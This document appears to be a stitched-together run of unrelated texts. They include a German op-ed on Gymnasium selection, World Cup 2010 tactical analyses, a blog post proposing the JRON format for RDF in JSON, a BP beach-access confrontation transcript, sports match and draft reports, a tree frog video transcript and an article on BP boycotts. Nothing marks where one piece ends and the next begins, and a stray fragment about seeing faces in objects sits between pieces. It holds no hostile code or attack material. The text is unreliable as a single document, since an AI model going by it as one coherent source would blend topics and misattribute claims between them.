" Die Quote derjenigen Schüler , die das G8 nicht mit Abitur beenden , liegt bei geschätzten 40 Prozent " , muss selbst Ulrich Pfaffmann , der bildungspolitische Sprecher der SPD in Bayern und Verfechter einer Gemeinschaftsschule bis zur zehnten Klasse , eingestehen .
Doch anstatt daraus die Konsequenz zu ziehen , die Qualität der Bildung durch eine bessere , gezieltere und striktere Auswahl rechtzeitig zu heben und die Abbrecherquoten dadurch spürbar zu senken , steigert man die Gymnasiastenzahl von Jahr zu Jahr .
Als ob man Wachstumszahlen , die das Land gewiss braucht , um aus der Krise zu kommen , mit mehr Abiturienten steigern könnte .
Wer der Ansicht ist , dass Bildung Wachstumssprünge auslösen und den Wohlstand eines Landes mehren könnte , der müsste eher die technischen und praktischen Kompetenzen von Lehrlingen steigern statt immer mehr Schüler durch die Pforten der gymnasialen Bildung zu jagen .
Es ist ja beileibe nicht so , dass jeder , der ein Abitur in der Tasche hat , automatisch auch einen " höheren Beruf " ergreifen kann oder dieses Bildungszertifikat ihm später ein sorgloses Auskommen sichern wird .
Die Generation Praktikum liefert ein beredtes Beispiel , zu welchen Kreisverkehr Überqualifizierung führen kann .
Weil die Politik solch unpopuläre Entscheidungen aber scheut , auch und vor allem aus Angst vor Lobbyistenverbänden wie dem LEV und den Schulen eine strengere Selektion verordnet , wird sich an diesen Zugangs - und Abbrecherquoten wenig ändern .
Gymnasium
Lösung einfach
Dabei wäre die Lösung doch so einfach .
Seit dem PISA - Schock werden jedes Jahr Jahrgangsstufentests in den Fächern Mathematik , Deutsch und Englisch durchgeführt .
Damit soll landesweit überprüft werden , wie weit logisches Denken , Lese - , Sprach - und Textverständnis bei den Schülern eines Jahrgangs entwickelt ist , welche Lernfortschritte sie und ihre Schule gemacht haben , ob sie in Zusammenhängen denken können und inwieweit sie in der Lage sind , bestimmte Probleme selbstständig zu lösen .
Leicht könnten diese oder ähnliche Tests dazu hergenommen werden , die Eignung eines Schülers für diese oder jene Bildungsanstalt festzustellen .
Die Verantwortung dafür würde dann auf die Schule und ihre Lehrer übergehen , die das anhand anspruchsvoller Kriterien prüfen .
Dazu bräuchte es nur den Willen und den Mut der Politik .
Doch die ist vielfach zu schwach , dem Druck , den Lobbyisten und Ideologen auf sie ausüben , zu widerstehen .
Im Prinzip weiß jeder , dass viel zu gute Noten vergeben werden .
Nicht nur in den Grundschulen oder an den Gymnasien , sondern später auch an den Universitäten des Landes , wo die Abbrecherquoten bekanntlich ähnlich hoch sind .
Teilweise aus Bequemlichkeit , man will ja keinen Ärger mit Eltern und Rechtsanwälten , teilweise aus Sorge der Schulleiter um den guten Ruf ihrer Schule in der Öffentlichkeit , und teilweise aus psychologischen Gründen , schließlich könnten schlechte Noten das Selbstwertgefühl schwächen und sich leicht zum Trauma auswachsen .
Statt ihrer Aufgabe und ihres Auftrags gerecht zu werden , Schüler wie Eltern beizeiten auf das richtige Bildungsgleis zu schieben , und gleichzeitig die Durchlässigkeit der einzelnen Bildungswege für Spätentwickler zu verbessern , lässt man sie lieber auf das falsche Gleis und sehendes Auges an die Wand fahren , was dann erst jene traumatischen Erfahrungen hervorruft , die man dann beklagt .
Niemand darf scheitern
Der Preis , der für das Nichthandeln der Politik gezahlt wird , ist ein hoher .
Der inflationären Verteilung von Bildungszertifikaten , die seit Jahren dem Motto nachhängt : Keiner darf scheitern , folgt die stete Abwertung ihrer Bedeutung .
Unternehmen , Behörden und Universitäten wissen , dass sie das Papier , auf dem sie stehen , nicht wert sind ( Wir sind alle Kreter ) .
Darum führen sie auch längst eigene Eignungstests durch .
Andererseits : Solange der Egalitätsgedanke über den Leistungsgedanken obsiegt , die Meinung vorherrschend ist , dass möglichst allen alles zugänglich gemacht und auch jeder studieren muss und kann ; und solange das Ziel der Bildung ausschließlich die Verteilung von Zertifikaten ist , und zwar auch dann , wenn sie sich jemand nachweislich nicht verdient hat , weil er sich a ) nicht angestrengt hat oder b ) ihm die Fähigkeiten dazu fehlen , und obendrein ein Scheitern von vornherein möglichst ausgeschlossen ist , wird sich an der Misere unserer Bildungssystems insgesamt wenig ändern .
Und zwar auch nicht mit mehr oder mit weniger Geld .
Da ist weder Annette Schavan noch Roland Koch zuzustimmen .
( Rudolf Maresch )
Remember this fixture from 2006 ?
The goals , the penalties , the fights ?
Of most interest in tactical terms was Jose Pekerman ’s decision to withdraw Juan Roman Riquelme towards the end of normal time , and replace him with the far more defensive - minded Esteban Cambiasso .
In doing so , he gave up on his preferred 4 - 3 - 1 - 2 / 4 - 4 - 2 diamond shape , and switched to a very basic , rigid 4 - 4 - 2 .
Argentina went from being 1 - 0 up , to 1 - 1 , to losing the game on penalties .
Sadly , we wo n’t be seeing Riquelme or Cambiasso in this contest , but Diego Maradona is faced with a similar tactical conundrum .
Should he keep to the side he used against South Korea and against Mexico – essentially a 4 - 4 - 2 diamond , or add more steel with another central midfielder ?
Predicting Maradona ’s selection decisions is not easy , as Argentina football expert Joel Richards points out …
Currently , Javier Mascherano is on his own in the centre of midfield , with Maxi Rodriguez and Angel di Maria shuttling either side .
Those two have performed their defensive tasks well so far , but in the first real rest Argentina will face , one of them might find themselves dropped .
The return of Juan Veron alongside Mascherano is one option .
He would replace one of the two shuttlers , and therefore shift Argentina back to something more like the formation used in their opening game against Nigeria , and increase their ability to keep the ball in the middle of the pitch .
Mario Bolatti is another who could feature , if Maradona wants to go more defensive .
He has been given the classic Argentina No 5 shirt and is effectively Cambiasso ’s replacement in the side , seemingly almost exclusively because of his crucial late winner in Montevideo in qualification .
He remains a bit of a mystery – disappointing in his stay at Porto , used sparingly at Fiorentina since joining in January – but still a major part of the Argentina squad .
The composition of the midfield will determine how the front three of Carlos Tevez , Lionel Messi and Gonzalo Higuain are used .
Primarily , it affects the movement of Tevez – he ’s happy to move to wide positions on either side – he played to the right against Nigeria , but to the left against South Korea and Mexico .
In turn , that dictates Higuain ’s drifts to the flanks – he drops into deep positions and allows Messi or Tevez to become the temporary front player .
Messi appears to have a free role .
Messi , as ever , is the key player for Germany to stop .
Argentina ’s pre-tournament 4 - 4 - 1 - 1 shape meant Messi could , to a certain extent , be the domain of one of the opposition centre - backs , but the use of both Tevez and Higuain ahead of him makes this impossible .
So the responsibility falls to the German midfield ; Bastian Schweinsteiger and Sami Khedira have received rave reviews for their performances so far , particularly for the way they controlled the game against England , but they ’ve yet to face a true central attacking midfielder in their four games so far , let alone someone as talented as Messi .
Schweinsteiger has generally played as the deeper of the two , so his job may be to concentrate heavily on stopping Messi – not as a man-marking job , simply as a ‘ try and tackle the world ’s best player ’ job .
Schweinsteiger ’s switch to a central midfield role has been a wonderful success , but this is altogether a new challenge for him .
Equally , Argentina ’s biggest task is dealing with Mesut Oezil .
There is a more natural solution here , in Mascherano , but does Oezil play too high up the pitch to be his main concern ?
If Mascherano is the only true central midfielder for Argentina , and looks to get goalside of Oezil , this will open up space for the runs of Khedira from deeper positions .
Upfront , the movement of Miroslav Klose and the consequent direct running of Thomas Mueller and Lukas Podolski are a real concern for the fairly slow Argentina defence , and a deeper defensive line than usual is probably the order of the day here , considering how easily a similarly static England defence was carved apart last weekend .
The final tactical issue concerns the full - backs .
Argentina ’s rarely get forward , assuming that Nicolas Otamendi continues in place of Jonas Gutierrez ( a naturally more energetic player ) at right - back .
The key to the game could be the offensive tendencies of Germany ’s duo – Philip Lahm is clearly more of an attacking force than Jerome Boateng , but which one will have to be concerned with Tevez ’s movement ?
Would Joachim Loew consider swapping them around ( they ’re both comfortable on either side ) to release Lahm ?
Would Tevez follow ?
Would Argentina ’s midfield be able to adapt accordingly ?
Despite Argentina being the favourites , it is Maradona who appears to have the greater dilemmas ahead of this contest .

From JSON to RDF in Six Easy Steps with JRON June 4 , 2010
Sometimes , if you stand in the right place and squint , JSON and RDF line up perfectly .
Each time I notice this , I badly want a way to make them line up all the time , no matter where you ’re standing .
And , actually , I think it ’s pretty easy .
I ’ve seen a few proposals for how to work with RDF data in JSON , but the ones I ’ve seen put too much burden on JSON folks to accomodate RDF .
It seems to me we can let JSON keep doing what it does so well , and meanwhile , we can provide bits of RDF which can be adopted when needed .
Instead of pushing RDF on people , allow them to take the parts they find useful .
In thinking about it , I ’ve come up with six things RDF can do that are not standard parts of JSON .
These are things one can do with JSON , of course , but not in any standard way .
My suggestion is these bits of functionally be provided in an RDF - compatible way ( as I detail below ) , so that the JSON world and the RDF world can start to really play well together .
I ’m interested to hear what people think of this .
Blog comment , email to sandro@hawke.org ( maybe cc semantic-web@w3.org ? ) , or catch me in the halls at SemTech .
I expect this general topic of RDF - meets - JSON will be discussed at the RDF Next Steps workshop , and if the stars line up right , maybe we can get a W3C Recommendation in this space in the next year or so .
Let ’s call this particular proposal JRON 0.1 ( Javascript RDF Object Notation ) , not “ Sandro ’s Proposal ” , so I can be freer to like other designs and be properly neutral .
Step 0 : Start with ordinary JSON
In general , JSON and RDF are very similar , although they are usually described using different terminology .
Of course , they both have strings and numbers .
They both have way of encoding a sequence of items : arrays in JSON , lists in RDF ( some details below ) .
The main structuring is around key - value pairs , which JSON calls an ‘ object ’ .
In RDF we call it the “ subject ” and focus on its connection with each key - value pair ; the three together form an RDF triple .
The point here is that ordinary JSON structures correspond to an important subset of RDF .
The do n’t exactly match that subset because RDF uses namespace , as detailed in step 5 below .
The other steps below show the ways in which JSON is a subset of RDF .
If one takes all the steps here , using JSON with these conventions , one has full RDF .
So , here are the steps .
Steps 1 - 3 are pretty simple and not very interesting .
They address everyday concerns in data processing .
Steps 4 - 6 may be a little more surprising if you ’re not familiar with RDF .
Step 1 : Allow Extended Datatypes
Why : For datatypes , JSON only has strings , numbers , booleans .
Sometimes people want to store and manipulate other datatypes , such as dates , or application - specific datatypes .
How : RDF uses XML ’s datatype mechanism , where data values are conveyed as a pair of items : a lexical representation ( a sequence of characters ) and a datatype identifier ( a sequences of characters which happens to be a URI ) .
Each datatype is a mapping from strings ( lexical representations ) to values ; the datatype identifier tells us which datatype is to be used to interpret this particular representation .
In JRON , we represent this pair like this :
{ " __repr " : " 2010-03-06 " , " __type " : " http://www.w3.org/2001/XMLSchema#date " }
You can put this as a value in a list or in a key - value pair , just like a string or number .
RDF does n’t restrict which datatypes are used .
Some recent standards work selected this list as the set people should implement .
Personally , I ’m not sure users need to be able to extend datatypes .
I see dates being important , but otherwise I ’m not convinced .
Still , it ’s in RDF , and I like compatibility , so it ’s here .
Step 2 : Allow Language Tags
Why :
When you have text available in several different languages , language tags provide a way to select which of the available strings , if any , matches the language preference of the user .
Also :
Text - to - speech systems can handle text better if they know which natural language to use in pronouncing the text .
How : RDF allows language tags on string literals .
In JRON , we use a pair like this :
{ " __text " : " chat " , " __lang " : " fr " }
Commentary : Personally , I ’ve never liked this bit of RDF .
I feel like there are better architectures for handling language tagging .
But there was a vocal community that felt this was essential , so it ’s in the standard .
I gather some people like it , and I have n’t seen a good counter - proposal .
Step 3 : Allow Non-Tree Structures
Why : Sometimes your data is not tree structured .
Sometimes you have an arbitrary directed graph , such as when representing a social network .
How :
In RDF , an arbitrary “ node id ” is available for making non-tree structures .
We can do the same in JRON , saying any object may have a node id , and if it does , the object is considered the same as all other objects with the same node id .
Like this bit JSON saying my friend Eric and I both know each other :
... { " foaf_name " : " Sandro Hawke " , " foaf_knows : { " __node_id " : " n102 " } , " __node_id " : " n334 " } ... { " foaf_name " : " Eric Prud'hommeaux " , " foaf_knows : { " __node_id " : " n334 " } , " __node_id " : " n102 " } ...
In the above example , the objects representing me and Eric are given node ids , and then those node ids are used to make the links to each other .
We could also do this with only one node id , but we still need at least one :
{ " foaf_name " : " Sandro Hawke " , " foaf_knows : { " foaf_name " : " Eric Prud'hommeaux " , " foaf_knows : { " __node_id " : " n334 " } , " __node_id " : " n334 " }
Okay , those were the ordinary three things to add to JSON .
Here are the interesting three :
Step 4 : Allow Cross - Document Structures
Why : Sometimes , there is useful , relevant data available on the Web but it ’s not part of the current JSON document .
We would not want all the Web pages in the world to be gathered into one big Web page ; similarly , it ’s good to keep data in different documents .
But that should n’t stop us from easily combining the data , and keeping the links intact .
How : RDF allows IRIs ( unicode web addresses ) to be used as node identifiers .
They are like node ids , except they work across multiple documents ; they are globally unambiguous identifiers , and systems can use Web protocols to dereference them to get other useful information .
In JSON , we can do this :
{ " foaf_name " : " Sandro Hawke " , " __iri " : " http://www.w3.org/People/Sandro/data#Sandro_Hawke "
}
Commentary :
So why do we still need __node_id ?
Because sometimes it ’s a pain to make up a good IRI .
Some people prefer to always use IRIs , avoiding node_ids in their data , and that ’s fine .
Step 5 : Put Keys in Namespaces
Why :
When data is coming from different sources across the Web , it ’s not practical to get all the sources to agree on all the terminology .
Instead , by using Web addresses ( URLs / IRIs ) as our keys , we allow individuals and organizations to make their own decisions .
They can decide how much to share their vocabularies , and they avoid accidental name collisions .
The web address also provides a handy link to documentation , community sites , schemas , etc .
How :
It ’s awkward to use a whole , long http IRIs everywhere , so as in many RDF syntaxes , JRON has a prefix expansion mechanism , like this :
{ " foaf_name " : " Sandro Hawke " , ... " __prefixes " : { " foaf_ " : " http://xmlns.com/foaf/0.1/ " } }
Here the key “ foaf_name ” gets expanded into “ http://xmlns.com/foaf/0.1/name”, which serves as a unique - on - the - Internet identifier for a particular conceptualization of names .
Commentary : Although I ’ve left it almost to the end , this is the one mandatory part of this proposal .
All the other elements are only present when required by the data .
The null JRON document is : { “ __prefixes ” : {}}
Others have suggested this part can be optional , too , by having a set of standard prefixes for a given API .
I ’m not entirely opposed to that , but I ’m concerned about how those defaults would be communicated in practice .
Also , I ’m not sure there ’s consensus on what character to use in the short name : should it be foaf_name , foaf .
name , foaf : name , or what ?
The mechanism here is that you can use whatever you want : the __prefixes table keys are matched longest - first .
If there ’s an entry with an empty string , that provides a default namespace .
Step 6 : Allow Multiple Values Per Key
Why : Sometimes it makes sense to have more than one value for some property .
For instance , as it turns out , I have more than one friend .
I could use a single - value ‘ list - of - friends ’ property , but sometimes it makes more sense to use a ‘ friend ’ property that has multiple values .
In particular , if we ’ll be learning who my friends are from multiple sources , and we were using lists , what order would we put the resulting combined list in ?
How :
We still just use JSON lists , but we indicate that the order does not matter , so the values can be merged arbitrarily :
{ " foaf.name " : " Sandro Hawke " , " foaf. knows : { " __values " : [ { " foaf.name " : " Eric Prud'hommeaux " } , { " foaf.name " : " Dan Brickley " } , { " foaf.name " : " Matt Womer " } ] } }
Closing Thoughts
That ’s it .
Those are the six things that RDF does that normal JSONdoes n’t do .
Did I miss something ?
The API I ’m imagining ( but have n’t built yet ) would have a few
features like :
jron_reprefix ( tree , desired_prefixes )
Returns another JRON tree with all the prefixes matching the ones provided here .
If you ’re going to use foaf , for instance , you probably want to set a prefix like “ foaf . ” for foaf , so your code can expect it . jron_merge_nodes ( tree ) and jron_treeify ( tree ) convert a tree ( suitable for transmitting ) from / to a graph ( suitable for use in memory jron_use_native_type( tree )
Would convert all the __type / __repr objects into suitable local objects , if they exist .
Maybe even date / time objects , if there ’s a suitable library installed for those .
One technical issue for RDF folks :
Should JSON arrays be considered RDF Lists or RDF Sequences ?
Perhaps they default to RDF
Lists but there can be an option flag in the top - level object :
{ ... " __json_array_is_rdf_seq " : true ... }
When that flag is absent or false , arrays would be considered RDF Lists .
My sense is no one needs to use both .
Maybe soon we ’ll know if RDF Sequences can finally be deprecated .
Spain are the World Champions .
They were the better side and played a more positive , cohesive brand of football throughout .
There were no surprises when the team line - ups were announced just over an hour before kick - off , they were as predicted in the preview .
Vicente del Bosque kept with the side that beat Germany in the semi-final , meaning Pedro Rodriguez started ahead of Fernando Torres .
Holland , meanwhile , welcomed back Gregory van der Wiel and Nigel de Jong from suspension , meaning they returned to their first choice XI – as evidenced by them lining up with the numbers 1 - 11 .
There was also no surprise in the pattern of play in the first quarter of an hour , for Spain dominated possession and were camped in the Dutch half .
Bert van Marwijk ’s side seemed to be inviting pressure , and Spain ’s pressing when they lost the ball meant Holland were unable to construct any meaningful attacks of their own .
There seemed to be a shift in tactics from Holland after around 10 or 15 minutes – they started pressing earlier and higher up the pitch , seeking to disrupt the passing of Sergio Busquets and Xabi Alonso – the latter in particular had too much time on the ball in the opening period , and his influence declined as soon as he was closed down .
The pressing also complimented the tactics of their back four , who were playing a surprisingly high line .
On three separate occasions early on , through balls nearly found David Villa in behind the Dutch defence .
The problem was not necessarily the high defensive line , but the fact that there was never any pressure on the man looking to play the pass .
Playing that position , Villa needs service , so when the supply was cut off , he was less visible and Holland looked more comfortable .
Holland were creating little , however .
Wesley Sneijder was quiet and Arjen Robben was cutting in and running into traffic – Busquets , Alonso and Xavi all understood the need for one of them to occupy the space next to Joan Capdevilla that Robben likes to work in .
It became apparent that Holland were essentially using pure spoiling tactics , trying to physically unsettle Spain ’s creative players and break up the rhythm of the game .
Maybe they were influenced by Chile ’s positive start in the final group game , where Spain were second best until they took the lead , but the Dutch tactics went too far .
Mark van Bommel and Nigel de Jong could both have been dismissed in the first half for shocking tackles , and of the Dutch outfield players who started the game , only Dirk Kuyt and Sneijder finished without a booking .
Spain were not blameless in this respect either , and it was a poor first half .
Second half
This modern Holland side are n’t used to pressing intensively , and were n’t able to do it for the entire game .
In the second half they were clearly less effective in this respect , especially after Dirk Kuyt departed .
“ It ’s very difficult to play for 90 minutes at the rhythm they imposed ” , said del Bosque .
“ They had a great physical effort and we dominated extra time . ”
But the two managers should be praised for their substitutions , as almost every switch had a broadly attacking motive .
Eljero Elia for Kuyt , Cesc Fabregas for Alonso , Rafael van der Vaart for de Jong were all positive moves , and contributed to the game becoming more open and attractive in the second period .
Another del Bosque substitution was crucial – Pedro was withdrawn after a quiet start to the second half , and replaced with Jesus Navas .
And then , finally , Spain had natural width and someone to run at Giovanni van Bronckhorst , who eventually had to be replaced .
Navas ’ delivery was as inconsistent as ever , but he did a good job by stretching the play and providing dribbling rather than one - touch passing , which opened out the game and allowed Iniesta and Xavi more space to work in .
It was Navas ’ run and cross that presented Villa with a golden opportunity at the far post midway through the second half , and later his run and shot deflected inches wide , into the sidenetting .
But the biggest goal threat was coming from Holland , through direct counter - attacks .
The introduction of Elia meant Holland had a natural winger on the left , allowing Robben to make more direct runs in behind the defence , and he twice came close to breaking the deadlock .
Spain have often looked vulnerable against pacey forwards at this tournament , and Robben ’s move inside exploited this weakness .
Robin van Persie was playing an intelligent role by dropping deep to the left to distract the centre - backs , allowing Robben the opportunity to make runs on their blind side – once a straight ball found him and he shot straight at Casillas , another time van Persie ’s flick - on put him through , but he was eased out by Puyol .
Spain eventually find a way through
Whilst Pedro started brightly and faded , Iniesta was the opposite .
He was barely visible in the first half , but grew in stature later on and became the game ’s most important player .
Twice he found himself in good goalscoring positions in the Dutch penalty area but delayed the shot and the move broke down , but the positive for del Bosque was that the game was being dictated by him , rather than Sneijder or van Bommel .
The other key factor was the introduction of Fabregas .
This allowed Xavi to drop deeper , where he could see the whole of the attacking area ahead of him , whilst Fabregas provided direct , driving runs from midfield , both on and off the ball .
He had the best chance in the opening period of extra time when he went through one - on - one with Maarten Stekelenburg , though his finish was weak .
Spain ’s midfield now had more variety – they now had both width and direct running , and after Holland were worn down by the Spain passing earlier , they were now struggling with the more blatant attacking threat .
Maybe Spain needed Holland to go down to ten men to make the breakthrough .
It ’s a shame when a game is essentially decided by a red card , but considering Holland played such a physical game , it was no real surprise when Howard Webb was forced to reach for his red card .
Holland were only living with Spain through fouling , and they essentially paid the price for that .
Having used all three substitutes , van Marwijk was forced into a three - man defence with van Bommel dropping back to help out , which then left them exposed in front of the defence , with de Jong having departed .
Heitinga ’s dismissal was when he tracked Iniesta into the box , and therefore it was probably no coincidence that after that , Iniesta found himself free to smash home the winner .
The goal was fitting in that it started with a long , mazy run from Navas , and was assisted by Fabregas from an advanced midfield position .
Iniesta had previously turned down those two excellent opportunities to shoot , but made no mistake this time .
It was effectively a golden goal – Holland had no energy left and were a man light , and did n’t manage to construct anything meaningful in the final four minutes .
They will obviously be devastated but can have few complaints – they were second best on the day , and they failed to take their chances .
Spain were n’t much better in front of goal , but when Iniesta finally found the net , a 1 - 0 Spain win seemed the fairest outcome .
“ It is harsh , but the best team won tonight ” , van Marwijk conceded .
Conclusion
A disappointing final , because it was based around fouls and cards rather than technical quality or even a real tactical battle .
Spain dominated the game but failed to score when Holland had eleven men on the pitch .
They eventually found a way through when they offered more of a varied attacking threat , and the impact of substitutes was a key factor .
Navas and Fabregas clearly influenced the game , whilst it ’s difficult to remember what Elia or van der Vaart contributed .
Pressing was also key – the less Holland could do it , the more Spain created .
Spain will now go down as one of the greatest international sides in history – European Championship and World Cup holders , and an incredible record leading up to both tournaments .
In both competitions they have struggled to find a perfect system going forward , but the key in their success has not been their attacking play , but their defensive ability .
Seven knockout games played over the two tournaments , and seven clean sheets .

This weekend , WDSU reporter Scott Walker got the full court press from BP ’s onsite supervisor , leading to this perplexing and infuriating exchange that takes place in the video above .
BP OFFICIAL : Every single security guard here has given instructions to every single news crew : you can be outside of a hundred yards of the workers on the boom .
WALKER : And who ’s saying that ?
Because no one can tell me , unless you are the Jefferson Parish Sheriff ’s Office , you are the Coast Guard , or you ’re the military , can you tell me where to go on this public beach .
BP OFFICIAL : I can tell you where to go because I am employed to keep this beach safe .
And right now , those are my instructions .
I have to keep the workers safe as well .
WALKER : I am going to go and try to talk to a worker under the tent , can I do that ?
BP OFFICIAL : No , no .
WALKER : He ’s on a break .
BP OFFICIAL : You are not allowed to interview any workers .
WALKER : The workers can talk to the media according to the BP CEO two days ago .
The word still has n’t trickled down to you all yet ?
SECOND BP OFFICIAL :
We already heard that one , too .
WALKER : What do you mean you ’ve heard that one ?
It ’s true .
BP OFFICIAL :
The email did not explicitly give you permission to do that .
WALKER : There are quotes from Doug Suttles that say no one had been barred access to talk to the media , and that it ’s a misunderstanding and that the word has n’t trickled down to all the appropriate channels yet .
That ’s what he said two days ago .
So two days later , that still has n’t trickled down .
BP OFFICIAL : It ’s been briefed to us …
WALKER : By whom ?
Who ’s briefing you all ?
BP OFFICIAL : That ’s not important right now .
What ?
Do these guys think they have Jedi mind powers or something ?
Walker argues his case further , and later in the clip , does attempt to interview the workers in the break tent .
Those workers are subsequently instructed by the second BP beach cop on how to refuse an interview and , en masse , they decline to be interviewed .
WDSU goes on to cite Suttles ’s statement , released to area media outlets : “ Recent media reports have suggested that individuals involved in the clean up operation have been prohibited from speaking to the media , and this is simply untrue . ”
But who are you going to believe ?
Doug Suttles or your lyin’ eyes ?

Cameroon struggled to make any impact after Eto'o was sent off Cameroon captain Samuel Eto'o was sent off on his return to the Indomitable Lions side , as his team slumped to a 3 - 1 defeat in Portugal .
The Inter Milan striker was dismissed in the first half for a second bookable offence in quick succession after returning to the side for their final two World Cup warm - up games .
A frustrated and agitated - looking Eto'o received his marching orders for a high tackle on Portugal left - back Duda , immediately after being booked by the referee for protesting , following the opener from Raul Meireles .
The Cameroonians looked unsettled after their captain 's departure , and were well beaten by a Portuguese team who looked a lot more polished and confident ahead of their departure for South Africa - in stark contrast to their visitors .
The Indomitable Lions are now six games without a win , but drew some little comfort from an impressive debut for German - born striker Eric Choupo - Moting , who has just been cleared to play for the west Africans .
Tottenham Hotspur defender Benoit Assou - Ekotto also put in an impressive performance on the left , after a shaky start .
However , Paul Le Guen 's team looked low on confidence and ideas throughout , grabbing a single goal through substitute Achille Webo 's speculative shot which ended up in Portuguese goalkeeper Eduardo 's bottom left - hand corner .
Portugal were a team on the trail of a confidence - boosting performance themselves after a demoralising 0 - 0 draw against Cape Verde last week , and duly found one , with Cristiano Ronaldo producing an assured captain 's performance , creating most of his team 's opportunities .
Ronaldo is still seeking his first goal for his country in almost two years , but he saw his former Manchester United team - mate Nani produce a fine chip for the winner , after Meireles had grabbed a brace .

It ’s been over two days since the Devils selected five players in the 2010 NHL Entry - Level draft .
With no first round pick in the mix , it ’s doubtful that we ’ll see any of the 2010 draftees in Newark this season ( except for prospect camp , which begins July 11 ) .
Many of the prospects are young , and they all have something to prove over the next few years .
While it ’s still too early to predict whether they will be a legend or bust , there is time to reflect on the picks .
In this post , I ’ll look at the two goalie selections the Devils made .
Coming into this year ’s draft , the Devils organization had a huge hole it needed to fill – goaltending .
After Martin Brodeur , the organization ’s depth and skill took a sharp dive .
The Devils had n’t drafted a goalie since 2005 , when the team selected Jeff Frazee .
Since then , Frazee has played average hockey in the minors ( 14 - 16 - 0 , 2.80 goals - against average , .910 save percentage ) , and the disparity between Brodeur and the rest grew larger .
To address that need , the Devils selected two goaltenders – Scott Wedgewood ( third round , 84th overall ) and Maxime Clermont ( sixth round , 174th overall ) .
While both players wo n’t be expected to immediately produce , they will need to provide some depth at the goalie position in the organization .
Both Wedgewood and Clermont were n’t big name draft targets .
Wedgewood , taken in the third round , did n’t even start for Plymouth of the Ontario Hockey League this season .
Wedgewood , ranked number 19 of 30 North American goalies , only played in 18 games this season .
He put together a 5 - 9 - 0 record , posting a 3.26 goals - against average and a .909 save percentage .
The 17 - year old also played in four postseason games , going 1 - 0 - 1 with a 2.07 GAA and a .956 save percentage .
During that overtime loss , Wedgewood made 70 saves .
While Wedgewood was drafted higher , Clermont certainly could match his potential .
Clermont became the second goalie drafted by the Devils in the sixth round , 174th overall .
The Montreal native was ranked one spot better than Wedgewood , checking in at 18 out of 30 North American goalies .
Clermont appeared in 66 games for the Gatineau Olympiques of the QMJHL , compiling a 2.81 GAA and .897 save percentage .
The goalie only went 24 - 31 - 0 , but was invited to participate on Team Cherry in the 2010 CHL Top Prospect game .
Hockey ’s Future describes Clermont as :
A solid goaltender , Clermont plays the angles well and shows a willingness to aggressively challenge opposing shooters .
Controlling rebounds well and having a good glove , Clermont ’s game will benefit as he gets quicker in the crease .
Possessing good size , he has struggled at times tracking the puck , especially through traffic , another thing that he ’ll need to improve upon .
Both goalies seem to be promising prospects .
They will both need significant time to improve , but they ’re both pretty young players .
With Brodeur looking like he can play past the age of 40 , Wedgewood and Clermont should get the time they need to improve .
I do n’t know if they ’ll ever be big stars in net , but the preliminary analysis seems bright for the Devils ’ new young goalies .
Every creature has been given a unique face and a distinguished identify .
But what if you start seeing faces everywhere , even in inanimate things ?

In behavior never before recorded by scientists , male red-eyed tree frogs are shown shaking their rumps and entire bodies to show dominance .
The shaking often precedes wrestling between the two males .

Unedited Transcript
No , they ’re not shivering .
And no , they ’re not getting shocked .
These red-eyed tree frogs in Panama have been recorded shaking their behinds to send a message .
This shaking , known as tremulation , is a form of communication between male tree frogs .
The males are tremulating to establish which is the dominant male .
They ’re claiming territory for their ‘ calling area ’ where they spend the night calling for a female mate .
Sometimes , the shaking leads to wrestling among males … and maybe even more shaking , until the loser retreats .
Researcher Michael Caldwell of Boston University and his colleagues used infrared cameras at the Smithsonian Tropical Research Institute in Panama to record the tremulation .
They even used robo - frogs , seen in the lower right here , for part of the experiment .
Caldwell suggests the shaking behavior had not been previously observed , probably because the tree frogs behave differently under white light , which researchers usually use to record these nocturnal creatures .
The red-eyed tree frogs live in the rain forests from southern Mexico to Northern South America .
Many scientists believe it developed its vivid scarlet eyes to shock predators into at least briefly questioning their meal choice .
And their neon - green bodies coupled with the red eyes may play havoc with their nocturnal predators ’ visual senses .
The tree frogs sleep by day stuck to leaf - bottoms with their eyes closed and body markings covered .
The scientists believe the vibrations created by the shaking are in important part of the communication because in many instances , the shaking frog was not even in view of the intended recipient of the message .
And even if he had his back turned , it seemed the receiving frog knew what the message was .
Caldwell and his colleagues published their findings in a recent online issue of “ Current Biology . ”
Though their discoveries are believed to be new , the researchers do n’t think the shaking behavior is isolated to the red-eyed tree frogs .
They suggest that vibrational signaling might , in fact , be common in other vertebrates that spend most of their time in the foliage of the rain forests .

There has been protest and direct action
It 's 45 days since the disaster on the Deepwater Horizon rig and the oil spill still is n't fixed , but just how angry are Americans at BP ?
There 's been blanket coverage on American rolling news stations .
Every national politician in the US has the spill at or near the top of his or her agenda .
And BP itself is already fighting a PR war to try to minimise the damage to its reputation from the oil starting to ravage the northern Gulf of Mexico coast .
SOCIAL MEDIA
If Facebook groups are a good indicator of rage , then the US is very angry indeed .
The group dedicated to " Boycott BP " is gaining over 30,000 members every day and is already around the 350,000 mark .
BP invests in a $ 50 m ad campaign , NOW ?
Come on BP - have the fumes gone to your brains already ???
Facebook commenter
Many vow not to buy BP petrol or products again and express visceral anger towards the oil firm .
Some have designed their own logos , satirical takes on BP 's green and yellow livery , featuring dripping oil and skulls .
This is an environmental crisis that ordinary people have been able to get to grips with online in a way not possible during the US 's other notorious oil spill , the Exxon Valdez disaster of 1989 .
Now the webcam of the broken pipe with the oil gushing into the sea has proved to be compelling viewing .
Hundreds of thousands of people have also watched the footage of robot arms doing their work .
THE BOYCOTT
Florida resident David Kearns has launched a one - man campaign of direct action against BP .
He has posted videos on YouTube under the alias Stanley Morton III .
One shows him spreading rubbish from his garden over the forecourt of a BP petrol station .
Image caption Hundreds of thousands have joined a Facebook group demanding a boycott
And he attaches banners and placards on fences adjacent to the stations in an effort to get people to stop buying .
" I 'm outraged .
We live here for our beaches , for our seafood , " he says .
" If you get people not to buy the gas at the pumps that hurts them .
It is an ' annoycott ' . "
He perceives success when he sees the price of BP petrol go lower than that of its local competitors .
" If the price of gas has gone down , it 's hitting their bottom line . "
BP is cagey over the effects on sales of the oil spill so far , and it has yet to be suggested that they are devastating .
The issue will be complicated for many , and such situations can lead to a " mild consumer response " , says Prof Monroe Friedman , author of Consumer Boycotts : Effecting Change Through the Marketplace and Media .
He says disastrous environmental incidents caused by companies , such as the spill , " do not necessarily lead to no - buy [ action ] .
They lead to symbolic kinds of action , things short of boycotts .
" Few of these gas stations are actually owned by offending companies , most of them are owned by independent operators .
" You are a consumer and you may be offended by the corporate actions but you may continue to buy the gas at your neighbourhood station .
One thing is convenience , you have been doing it for years .
You may know the guy who owns the station . "
